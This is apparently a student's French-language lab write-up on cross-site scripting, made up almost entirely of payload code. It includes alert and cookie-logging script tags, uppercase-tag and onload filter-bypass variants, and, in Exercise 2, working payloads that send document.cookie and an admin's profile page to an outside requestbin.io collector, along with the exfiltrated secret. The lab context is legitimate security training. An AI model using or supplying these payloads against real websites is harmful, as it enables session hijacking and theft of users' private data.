# S7 : Vulnérabilité WEB -XSS

## Exercice 1 

### a) Alert Popup 

```javascript
<script>alert("I hacked you")</script>
```

### b) Document Cookies

```javascript
<script>console.log(document.cookie)</script>
```

### c) Mettre les balises en majuscule

```javascript
<SCRIPT>console.log(document.cookie)</SCRIPT>
```
```javascript
<SCRIPT>alert("I hacked you")</SCRIPT>
```
### d) utiliser des buttons avec event, en donnant du JS dans l'attribut onClick

```javascript
<SCRIPT >alert("I hacked you")</SCRIPT >
```
```javascript
<SCRIPT >alert(document.cookie)</SCRIPT >
```

### e) utiliser des propriétés du type onLoad dans la balise body

```javascript
<body onload="alert(document.cookie)"></body>
```
```javascript
<body onload="alert('I hacked you')"></body>
```
## Exercice 2 

### a) Envoie des cookies à l'aide d'un objet XMLHttpRequest

```javascript
<script>
var http = new XMLHttpRequest(); http.open("POST", "https://requestbin.io/1i1r4xf1", true); http.send(document.cookie);
</script>
```
```javascript
var http = new XMLHttpRequest(); http.open("POST", "https://requestbin.io/1i1r4xf1", true); http.send(document.cookie);

```

### b)  Envoyez une balise script et s'envoyer le code qui s'execute sur la machine de l'admin
```javascript
<script>
var http = new XMLHttpRequest(); http.open("POST", "https://requestbin.io/1i1r4xf1", true); http.send(document.cookie);
</script>
```

### c) Correct Utilisation de XMLHttpRequest + propriété onLoad
```javascript
<script>
var http1 = new XMLHttpRequest();
http1.open("GET", "https://labosecuipl.alwaysdata.net/21/s07/ex2b/profile/", true);

http1.onload = () => {
    var http = new XMLHttpRequest();
    http.open("POST", "https://requestbin.io/1i1r4xf1", true);
    http.send(http1.response)
}
http1.send();
</script>
```
```html
<p>
    Your secret is : 
    <span id="secret">
        BigBrother is watching you !Or is he ?
    </span>
</p>
```

